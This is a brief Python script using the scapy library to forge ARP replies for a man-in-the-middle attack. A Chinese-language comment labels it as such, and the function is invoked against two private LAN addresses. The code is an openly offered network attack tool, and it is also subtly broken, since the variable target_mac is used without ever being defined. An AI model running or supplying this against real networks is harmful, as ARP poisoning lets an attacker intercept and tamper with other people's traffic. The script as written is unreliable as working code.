import scapy.all as scapy

def arp_spoof(target_ip, host_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    scapy.send(packet, verbose=False)

# 執行 arp_spoof 函數來執行 ARP 中間人攻擊
arp_spoof("192.168.0.1", "192.168.0.2")